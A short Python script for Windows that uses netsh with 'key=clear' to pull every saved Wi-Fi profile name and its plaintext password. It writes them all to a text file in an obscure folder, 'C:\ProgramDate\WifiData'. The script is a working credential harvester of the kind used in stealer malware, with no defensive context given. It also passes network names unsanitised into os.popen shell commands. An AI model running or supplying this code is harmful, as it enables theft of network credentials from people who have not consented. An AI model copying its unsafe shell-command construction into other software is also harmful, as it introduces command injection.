import re
import os


def wifipass():
    def get_wlans():
        data = os.popen("netsh wlan show profiles").read()
        wifi = re.compile("All User Profile\s*:.(.*)")
        return wifi.findall(data)

    def get_pass(network):
        try:
            wlan = os.popen("netsh wlan show profile " + str(network.replace(" ", "*")) + " key=clear").read()
            pass_regex = re.compile("Key Content\s*:.(.*)")
            return pass_regex.search(wlan).group(1)
        except:
            return " "

    def check_wlan():
        check = os.popen('netsh wlan show profile').read()
        if 'not running' in check:
            f = open(r"C:\ProgramDate\WifiData\no_wifi.txt", 'w')
            f.write('Not found Wifi:(')
            f.close()
        else:
            f = open(r"C:\ProgramDate\WifiData\wifi.txt", "w")
            for wlan in get_wlans():
                f.write("-----------\n" + " SSID : " + wlan + "\n Password : " + get_pass(wlan))
            f.close()
    check_wlan()
